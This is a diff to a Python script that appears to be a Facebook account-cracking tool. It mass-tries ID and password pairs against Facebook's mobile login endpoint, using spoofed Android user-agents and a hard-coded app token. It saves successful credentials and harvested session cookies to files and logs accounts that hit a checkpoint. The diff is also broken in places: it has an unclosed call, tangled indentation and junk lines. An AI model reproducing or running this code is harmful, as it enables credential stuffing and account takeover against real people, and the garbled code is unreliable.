@@ -797,44 +797,36 @@ def M_file_4(ids, names, passlist):
 			fbdv = device['fbdv']
 			fbsv = device['fbsv']
 			#fbca = device['fbca']
-			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			accees_token = ''
 			ua ="[Dalvik/2.1.0 (Linux; U; Android 14.5.0; CPH2207 Build/OPR6.101106.028) [FBAN/FB4A;FBAV/392.0.0.32.108;FBPN/com.facebook.katana;FBLC/en_US;FBBV/318413147;FBCR/MetroPCS;FBMF/OPPO;FBBD/oppo;FBDV/CPH2207;FBSV/14.5.0;FBCA/x86_64:x86:arm64-v8a;FBDM/{density=1.8,width=1345,height=1023};FB_FW/1;FBRV/318805181;]"+"[Dalvik/2.1.0 (Linux; U; Android 12.6.2; SM-J105F Build/PD2A.180728.025) [FBAN/FB4A;FBAV/391.1.0.37.104;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/318217130;FBCR/PremiumSIM;FBMF/Samsung;FBBD/samsung;FBDV/SM-J105F;FBSV/12.6.2;FBCA/arm64-v8a:;FBDM/{density=3.0,width=536,height=1820};FB_FW/1;]"+"[Dalvik/2.1.0 (Linux; U; Android 5.5.2; V17 Pro Build/PPR1.200306.029) [FBAN/FB4A;FBAV/31.0.0.0.0;FBPN/com.facebook.katana;FBLC/en_US;FBBV/7930627;FBCR/Verizon;FBMF/Vivo;FBBD/vivo;FBDV/V17 Pro;FBSV/5.5.2;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.75,width=774,height=2521};FB_FW/1;] FBBK/1]"+"[Dalvik/2.1.0 (Linux; U; Android 9.7.0; Y69 Build/PPR2.180202.010) [FBAN/FB4A;FBAV/139.0.0.26.93;FBPN/com.facebook.katana;FBLC/de_DE;FBBV/70506848;FBCR/Smartmobil;FBMF/Vivo;FBBD/vivo;FBDV/Y69;FBSV/9.7.0;FBCA/x86_64:armeabi-v7a;FBDM/{density=1.875,width=783,height=733};FB_FW/1;FBRV/70645913;]"+"[Dalvik/2.1.0 (Linux; U; Android 15.6.1; SM-J200F Build/QD4A.130310.058) [FBAN/FB4A;FBAV/465.0.0.0.6;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/452000754;FBCR/Telstra;FBMF/Samsung;FBBD/samsung;FBDV/SM-J200F;FBSV/15.6.1;FBCA/x86_64:x86:armeabi-v7a;FBDM/{density=1.278,width=684,height=1221};]"
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			url = 'https://b-graph.facebook.com/auth/login'
-			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
-			if 'session_key' in po:
-				print('\r\x1b[1;92m<[DJALIL_MK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-				open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
-				session = po['session_cookies']
-				cookie = ''
-				cuser = session[0]
-				cuser = session[0]['name']+'='+session[0]['value']
-				cookie+=cuser+';'
-				xs = session[1]['name']+'='+session[1]['value']
-				cookie+=xs+';'
-				fr = session[2]['name']+'='+session[2]['value']
-				cookie+=fr+';'
-				datr = session[3]['name']+'='+session[3]['value']
-				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
-				pagevoice = cvhmd.replace('c_user','m_page_voice')
-				cookie+=pagevoice
-				print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
-				open('/sdcard/DJALIL_MK_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
-				#token = po['access_token']
-				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
-				oks.append(ids)
-				breakpas
-elif 'www.facebook.com' in po['error']['message']:
-    if 'y' in pcp:
-        print('\r\x1b[38;5;246m[DJAJIL_MK-CP] : ' + ids + ' | ' + pas + '\x1b[0m')
-        open('/sdcard/DIALIL_MK_CP.txt', 'a').write(ids+' | '+pas+'\n')
-        cps.append(ids)
+			po = requests.post(url,params=data,headers=head,allow_redirects=False).json(
+try:
+    if 'session_key' in po:
+        print('\r\x1b[1;92m[DJALIL_MK-OK] ' + ids + ' | ' + pas + '\x1b[0m')
+        open('/sdcard/DJALIL_MK_m4_OK.txt', 'a').write(ids + ' | ' + pas + '\n')
+
+        session = po['session_cookies']
+        cookie = ''
+        for s in session:
+            cookie += s['name'] + '=' + s['value'] + ';'
+
+        print('\033[1;33m[BISCUT🍪] \033[1;33m ' + cookie)
+        open('/sdcard/DJALIL_MK_iDs_COOKIE_M4.txt', 'a').write(ids + '|' + cookie + '\n')
+        oks.append(ids)
         break
 
-else:
-    continue
+    elif 'www.facebook.com' in po['error']['message']:
+        if 'y' in pcp:
+            print('\r\033[38;5;246m[DJALIL_MK-CP] ' + ids + ' | ' + pas + '\033[0m')
+            open('/sdcard/DJALIL_MK-CP.txt', 'a').write(ids + '|' + pas + '\n')
+            cps.append(ids)
+            break
 
+    else:
+        continue
 loop += 1
 
 except requests.exceptions.ConnectionError:
@@ -843,22 +835,27 @@ except requests.exceptions.ConnectionError:
 except Exception as e:
     pass
 
+# الآن هذا الجزء خارج الـ try/except كما يجب
 print("TRY METHOD 1 & 4 FOR BEST RESULTS")
 dino()
-print(' \033[1;32m[\033[1;31m1\033[1;32m] METHOD / \033[1;31m MIX IDS ')
-print(' \033[1;32m[\033[1;31m2\033[1;32m] METHOD / \033[1;31m MIX IDS ')
-print(' \033[1;32m[\033[1;31m3\033[1;32m] METHOD / \033[1;31m MIX IDS ')
-print(' \033[1;32m[\033[1;31m4\033[1;32m] METHOD / \033[1;31m MIX IDS ')
+print(' \033[1;31m[1]\033[0m METHOD / MIX IDS')
+print(' \033[1;31m[2]\033[0m METHOD / MIX IDS')
+print(' \033[1;31m[3]\033[0m METHOD / MIX IDS')
+print(' \033[1;31m[4]\033[0m METHOD / MIX IDS')
 dino()
-mthd = input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+
+mthd = input(' CHOOSE : ')
 dino()
+
 plist = []
 ps_limit = 0
 clear()
-print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")
-print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
+
+print(' \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ')
+print(' \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ')
 dino()
-psx = input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
+
+psx = input(' CHOOSE : ')
 
 if psx in ['1', '01']:
     plist.append('first first')
@@ -1067,6 +1064,7 @@ raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
 open('').close()
+
 
 
 
